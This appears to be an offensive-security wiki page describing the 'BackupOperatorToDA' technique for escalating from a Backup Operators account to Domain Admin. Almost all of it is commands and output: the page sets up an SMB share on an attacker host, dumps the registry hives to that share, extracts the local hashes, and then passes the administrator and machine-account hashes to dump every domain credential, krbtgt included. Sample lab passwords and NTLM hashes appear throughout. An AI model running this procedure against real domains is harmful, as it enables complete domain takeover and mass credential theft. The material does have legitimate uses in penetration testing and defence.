---
title : "BackupOperatorToDA"
# pre : ' '
description : "From Backup Operator To Domain Admin."
date : 2022-02-22T17:33:18+01:00
# hidden : true
# draft : true
weight : 20
# tags : ['']
---

---

BackupOperatorToDA - From Backup Operator To Domain Admin.

If you compromise an account member of the group Backup Operators you can become the Domain Admin without RDP or WinRM on the Domain Controller.

All credit from [filip_dragovic](https://twitter.com/filip_dragovic) with his inital [POC](https://raw.githubusercontent.com/Wh04m1001/Random/main/BackupOperators.cpp) ! I build this project because I wanted to have a more generic binary with parameters and also being able to export the SAM database on the remote share!

## Prerequisites

- Compile the `.sln` file from [Github Repo](https://github.com/mpgn/BackupOperatorToDA) (or trust mine below.)
- Impacket [smbserver.py]({{< ref "smbserver-py" >}})
- Impacket [secretsdump.py]({{< ref "secretsdump-py" >}})
- Account in target domain with the 'Backup Operator' membership

{{%resources fa_icon_class="far fa-file" pattern=".*(exe)"/%}}

### Account checking

First it it important to be sure the user is member of the 'Backup Operator' group.

```plain
Microsoft Windows [Version 10.0.19043.1526]
(c) Microsoft Corporation. All rights reserved.

C:\Users\johndo>whoami
offsec\johndo

C:\Users\johndo>net user johndo /domain
The request will be processed at a domain controller for domain offsec.nl.

User name                    johndo
Full Name                    John Do
[...]

Local Group Memberships      *Backup Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

### Set-up smbserver.py

It is recommended to check if the share is reachable from a Windows workstation without additional credentials.

```plain
$ smbserver.py -smb2support -ip 10.20.30.16 share .
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.20.30.12,50555)
[*] AUTHENTICATE_MESSAGE (OFFSEC\johndo,WIN10)
[*] User WIN10\johndo authenticated successfully
[...]
```

## Exploiting the vulnerable configuration

### Executable running and dumping SAM/SYSTEM/SECURITY

```plain
PS C:\> .\BackupOperatorToDA_release.exe -t \\srv2019.offsec.nl -u johndo -p Welkom1234 -d offsec.nl -o \\10.20.30.16\share\
Making user token
Dumping SAM hive to \\10.20.30.16\share\SAM
Dumping SYSTEM hive to \\10.20.30.16\share\SYSTEM
Dumping SECURITY hive to \\10.20.30.16\share\SECURITY
```

### Secretsdump SAM/SYSTEM/SECURITY

Two hashes can be used from here, the **'$MACHINE.ACC'** and/or **'administrator'** hash.

```plain
$ secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x9319e551be8d75919967f0065e0132b9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:43bcb[...]
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e1842947e54ab3d9a8758531e8fc6049
[...]
```

### Dump everything

### Using administrator hash

```plain
$ secretsdump.py offsec.nl/administrator@srv2019.offsec.nl -hashes :97f2592347d8fbe42be381726ff9ea83 -just-dc
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0b5d64d34935c8a4780b715cfb444c4:::
offsec.nl\MARSHALL_FRANKS:1103:aad3b435b51404eeaad3b435b51404ee:dacd6680af15849bb89a4f0da30e99b0:::
offsec.nl\JAMES_VAUGHAN:1104:aad3b435b51404eeaad3b435b51404ee:75ed74673dd7bf358d48207fdd0d42e0:::
offsec.nl\WARD_CONTRERAS:1105:aad3b435b51404eeaad3b435b51404ee:e0e7955fe13737060bd2d0c5049a78d2:::
offsec.nl\EDDY_MILES:1106:aad3b435b51404eeaad3b435b51404ee:f41a8d181561d36de8ebfc96a0caac0f:::
offsec.nl\ANDREW_VASQUEZ:1107:aad3b435b51404eeaad3b435b51404ee:bc13660676fce9b4aab8fac6ed8adcd5:::
offsec.nl\ULYSSES_COTE:1108:aad3b435b51404eeaad3b435b51404ee:c7f0cab839fde136be09348e15febaba:::
[...]
```

### Using machine account hash

```plain
$ secretsdump.py offsec.nl/'srv2019$'@srv2019.offsec.nl -hashes :e1842947e54ab3d9a8758531e8fc6049 -just-dc
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0b5d64d34935c8a4780b715cfb444c4:::
offsec.nl\MARSHALL_FRANKS:1103:aad3b435b51404eeaad3b435b51404ee:dacd6680af15849bb89a4f0da30e99b0:::
offsec.nl\JAMES_VAUGHAN:1104:aad3b435b51404eeaad3b435b51404ee:75ed74673dd7bf358d48207fdd0d42e0:::
offsec.nl\WARD_CONTRERAS:1105:aad3b435b51404eeaad3b435b51404ee:e0e7955fe13737060bd2d0c5049a78d2:::
offsec.nl\EDDY_MILES:1106:aad3b435b51404eeaad3b435b51404ee:f41a8d181561d36de8ebfc96a0caac0f:::
offsec.nl\ANDREW_VASQUEZ:1107:aad3b435b51404eeaad3b435b51404ee:bc13660676fce9b4aab8fac6ed8adcd5:::
offsec.nl\ULYSSES_COTE:1108:aad3b435b51404eeaad3b435b51404ee:c7f0cab839fde136be09348e15febaba:::
[...]
```

## URL List

- [Github.com - From Backup Operator To Domain Admin](https://github.com/mpgn/BackupOperatorToDA)
